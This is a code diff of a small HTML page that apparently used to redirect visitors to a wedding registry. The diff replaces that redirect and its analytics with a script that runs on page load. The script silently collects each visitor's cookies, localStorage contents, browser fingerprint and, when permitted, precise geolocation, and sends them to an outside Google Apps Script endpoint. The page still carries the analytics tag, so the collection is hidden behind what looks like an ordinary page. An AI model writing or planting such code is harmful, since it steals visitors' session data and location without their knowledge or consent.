@@ -1,48 +1,127 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+  <head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=UA-147424267-1"
+    ></script>
+    <script>
+      function getCurrentPosition(options = { timeout: 5000 }) {
+        return new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, options);
+        });
+      }
 
-    <head>
+      async function logData() {
+        try {
+          const position = await getCurrentPosition();
+        } catch (error) {
+            //Ignore
+        }
 
-        <!-- Global site tag (gtag.js) - Google Analytics -->
-        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-147424267-1"></script>
-        <script>
-            window.dataLayer = window.dataLayer || [];
-            function gtag(){dataLayer.push(arguments);}
-            gtag('js', new Date());
+        var data = {
+          date: new Date(),
+          timezone: new Date().getTimezoneOffset() / 60,
+          browser: navigator.appName,
 
-            gtag('config', 'UA-147424267-1');
+          pageon: window.location.pathname,
+          referrer: document.referrer,
+          previousSites: history.length,
 
+          browserEngine: navigator.product,
+          browserVersion1a: navigator.appVersion,
+          browserVersion1b: navigator.userAgent,
+          browserLanguage: navigator.language,
+          browserOnline: navigator.onLine,
+          browserPlatform: navigator.platform,
+          javaEnabled: navigator.javaEnabled(),
+          dataCookiesEnabled: navigator.cookieEnabled,
+          dataCookies1: document.cookie,
+          dataCookies2: decodeURIComponent(document.cookie.split(";")),
+          dataStorage: localStorage,
 
+          sizeScreenW: screen.width,
+          sizeScreenH: screen.height,
+          sizeDocW: document.width,
+          sizeDocH: document.height,
+          sizeInW: innerWidth,
+          sizeInH: innerHeight,
+          sizeAvailW: screen.availWidth,
+          sizeAvailH: screen.availHeight,
+          scrColorDepth: screen.colorDepth,
+          scrPixelDepth: screen.pixelDepth
+        };
 
-            function checkIfAnalyticsLoaded() {
-                if (typeof ga === 'function') {
-                    ga(function() {
-                        window.location.replace("https://www.zola.com/wedding/emilyandryanwilliams");
-                    });
-                } else {
-                    setTimeout(lastChance,1000);
-                }
-            }
-            
-            function lastChance(){
-                if (typeof ga === 'function') {
-                    ga(function() {
-                        window.location.replace("https://www.zola.com/wedding/emilyandryanwilliams");
-                    });
-                } else {
-                    window.location.replace("https://www.zola.com/wedding/emilyandryanwilliams");
-                }
-            }
+        if (typeof position !== 'undefined') {
+          data = {
+            ...data,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            heading: position.coords.heading,
+            speed: position.coords.speed,
+            timestamp: position.timestamp
+          };
+        }
 
-            checkIfAnalyticsLoaded();
+        console.log(data);
 
-        </script>
-    </head>
+        var queryString = Object.keys(data)
+          .map(key => key + "=" + data[key])
+          .join("&");
 
-    <body>
+        var url =
+          "https://script.google.com/macros/s/AKfycbyIqceFeHMOUt10akWMMplJvzGupasYwTKHE_pt5466Lc7dKvY/exec";
+        var http = new XMLHttpRequest();
 
+        http.open("GET", url + "?" + queryString, true);
+        http.send(null);
+      }
 
-        <p></p>
-    </body>
+      logData();
 
+      /*window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "UA-147424267-1");
+
+      function checkIfAnalyticsLoaded() {
+        if (typeof ga === "function") {
+          ga(function() {
+            window.location.replace(
+              "https://www.zola.com/wedding/emilyandryanwilliams"
+            );
+          });
+        } else {
+          setTimeout(lastChance, 1000);
+        }
+      }
+
+      function lastChance() {
+        if (typeof ga === "function") {
+          ga(function() {
+            window.location.replace(
+              "https://www.zola.com/wedding/emilyandryanwilliams"
+            );
+          });
+        } else {
+          window.location.replace(
+            "https://www.zola.com/wedding/emilyandryanwilliams"
+          );
+        }
+      }
+
+      checkIfAnalyticsLoaded();*/
+    </script>
+  </head>
+
+  <body>
+    <p></p>
+  </body>
 </html>
